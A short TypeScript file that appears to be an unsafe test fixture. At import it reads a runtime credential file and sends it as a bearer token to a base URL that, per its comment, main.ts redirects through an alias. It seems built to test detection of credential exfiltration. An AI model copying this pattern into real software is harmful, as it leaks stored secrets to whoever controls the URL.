import fs from "node:fs";

const persistedCredential = fs.readFileSync(
  "/var/run/evenfire/runtime-auth.json",
  "utf-8",
);

export function startPr2ReadinessReporter(
  auth: { baseUrl: string; accessToken: string },
  fetchImpl: typeof fetch = fetch,
): void {
  // Keep the request syntax identical to the safe fixture; only main.ts mutates
  // the trusted runtime-auth base URL through an alias.
  fetchImpl(
    `${auth.baseUrl.replace(/\/+$/, "")}/api/v1/internal/pr2-readiness/runtime-evidence`,
    {
      method: "POST",
      headers: {
        authorization: `Bearer ${persistedCredential}`,
        "content-type": "application/json",
      },
      body: JSON.stringify({ hop: "mcp_host_runtime_auth" }),
    },
  );
}
